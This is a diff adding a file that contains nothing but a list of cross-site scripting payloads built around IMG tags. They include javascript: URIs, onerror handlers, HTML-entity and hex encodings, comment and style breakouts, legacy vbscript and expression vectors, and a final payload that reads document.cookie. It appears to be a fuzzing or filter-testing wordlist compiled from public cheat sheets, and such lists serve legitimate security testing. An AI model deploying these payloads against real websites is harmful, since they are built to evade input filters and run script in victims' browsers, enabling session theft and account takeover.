@@ -1,0 +1,61 @@
+<IMG SRC=jAVasCrIPt:alert('XSS')>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert('XSS')>      
+<img src=xss onerror=alert(1)>
+<img/src=`%00` onerror=this.onerror=confirm(1)
+<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+<img src="/" =_=" title="onerror='prompt(1)'">
+<img src=`xx:xx`onerror=alert(1)>
+<img src ?itworksonchrome?\/onerror = alert(1)
+<--`<img/src=` onerror=alert(1)> --!>
+"><img src=x onerror=window.open('https://www.google.com/');>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC="jav ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="javascript:alert('XSS')"
+<img src="javascript:alert('XSS');">
+<img src=javascript:alert(&quot;XSS&quot;)>
+<!--<img src="--><img src=x onerror=alert(XSS)//">
+<![><img src="]><img src=x onerror=alert(XSS)//">
+<style><img src="</style><img src=x onerror=alert(XSS)//">
+&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
+&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
+&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
+&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
+&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
+&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
+&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
+&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
+&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
+perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
+&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
+&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
+&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
+&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
+&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
+&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
+&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
+&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
+&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
+&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
+&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascrscriptipt:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<!--<img src="--><img src=x onerror=alert(123)//">
+<style><img src="</style><img src=x onerror=alert(123)//">
+<img src=asdf onerror=alert(document.cookie)>
